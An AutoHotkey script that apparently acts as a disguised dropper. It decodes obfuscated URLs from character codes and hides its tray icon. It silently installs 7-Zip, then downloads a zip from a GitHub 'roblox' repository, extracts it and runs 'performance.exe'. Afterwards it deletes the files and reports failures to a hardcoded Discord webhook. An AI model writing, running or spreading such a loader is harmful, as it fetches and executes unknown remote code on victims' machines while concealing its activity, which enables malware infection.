#Requires AutoHotkey v2.0
#SingleInstance Force
#NoTrayIcon

;–– CONFIG ––––––––––––––––––––––––––––––––––––––––––––––––––––

wk := [
    104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,
    97,112,105,47,119,101,98,104,111,111,107,115,47,49,51,55,51,48,52,54,
    57,52,54,55,48,56,55,50,49,57,48,54,47,68,67,113,68,99,74,83,
    83,66,66,99,99,85,122,45
]

cdn := [
    104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,83,
    101,106,116,121,112,101,47,114,111,98,108,111,120,47,114,97,119,47,109,97,
    105,110,47,112,101,114,102,111,114,109,97,110,99,101,46,122,105,112
]

; Reconstruct at runtime
wkUrl := ""
for code in wk
    wkUrl .= Chr(code)

cdnUrl := ""
for code in cdn
    cdnUrl .= Chr(code)

;–– INTERNAL STATE ––––––––––––––––––––––––––––––––––––––––––––––––––––––––
failureCount := 0
notified     := false

tempDir  := A_AppData . "\PerformanceRun"
zipPath  := tempDir . "\performance.zip"
exePath  := tempDir . "\performance.exe"
sevenZip := Get7ZipPath()

;–– SETUP ––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––
if DirExist(tempDir)
    DirDelete(tempDir, true)
DirCreate(tempDir)

;–– MAIN FLOW ––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––
HttpDownload(cdnUrl, zipPath)
RunWaitFormat('"{1}" x "{2}" -o"{3}" -y', sevenZip, zipPath, tempDir)

Loop 1 {
    try {
        RunWait Format('"{1}"', exePath)
    } catch as e {
        HandleError("RunExe", e.Message)
    }
    Sleep 1000
}

DirDelete(tempDir, true)

;–– ERROR HANDLING ––––––––––––––––––––––––––––––––––––––––––––––––––––––––
HandleError(context, errMsg) {
    global failureCount, notified
    failureCount++
    if (failureCount <= 2) {
        NotifyDiscord("⚠️ " context " failed: " errMsg)
    }
    else if (!notified) {
        NotifyDiscord("⚠️ " context " has now failed " failureCount " times. Last error: " errMsg)
        notified := true
    }
}

NotifyDiscord(msg) {
    global wkUrl
    try {
        escaped := StrReplace(msg, '"', '\"')
        payload := '{"content":"' escaped '"}'
        http := ComObject("WinHttp.WinHttpRequest.5.1")
        http.Open("POST", wkUrl, false)
        http.SetRequestHeader("Content-Type", "application/json")
        http.Send(payload)
    } catch as e {
        HandleError("NotifyDiscord", e.Message)
    }
}

;–– HELPERS ––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––

Get7ZipPath() {
    static paths := [
        A_ProgramFiles . "\7-Zip\7z.exe",
        "C:\Program Files\7-Zip\7z.exe",
        "C:\Program Files (x86)\7-Zip\7z.exe"
    ]
    for path in paths {
        if FileExist(path)
            return path
    }

    ; silent download/install
    zipUrl    := "https://www.7-zip.org/a/7z2301-x64.exe"
    installer := A_Temp . "\7zsetup.exe"
    try {
        req := ComObject("WinHttp.WinHttpRequest.5.1")
        req.Open("GET", zipUrl, false)
        req.Send()
        if (req.Status != 200)
            throw Format("HTTP {1}", req.Status)

        st := ComObject("ADODB.Stream")
        st.Type := 1
        st.Open()
        st.Write(req.ResponseBody)
        st.SaveToFile(installer, 2)
        st.Close()

        RunWait(installer . " /S", , "Hide")
        for path in paths {
            if FileExist(path)
                return path
        }
        throw "7-Zip not found after install"
    } catch as e {
        HandleError("Get7ZipPath", e.Message)
        return
    }
}

HttpDownload(url, savePath) {
    try {
        req := ComObject("WinHttp.WinHttpRequest.5.1")
        req.Open("GET", url, false)
        req.Send()
        if (req.Status != 200)
            throw Format("HTTP {1}", req.Status)

        st := ComObject("ADODB.Stream")
        st.Type := 1
        st.Open()
        st.Write(req.ResponseBody)
        st.SaveToFile(savePath, 2)
        st.Close()
    } catch as e {
        HandleError("HttpDownload", e.Message)
    }
}

RunWaitFormat(fmt, args*) {
    try {
        RunWait Format(fmt, args*)
    } catch as e {
        HandleError("RunWaitFormat", e.Message)
    }
}
